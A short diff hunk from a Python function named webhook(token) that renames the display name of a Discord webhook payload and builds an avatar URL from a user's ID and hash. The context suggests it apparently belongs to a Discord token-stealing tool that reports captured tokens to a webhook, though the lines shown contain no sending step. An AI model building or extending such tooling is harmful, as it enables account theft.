@@ -362,7 +362,7 @@ def webhook(token):
     avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else None
 
     payload = {
-        "username": "Lucef | Token", 
+        "username": "Lucet | Token", 
         "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
         "embeds": [
             {
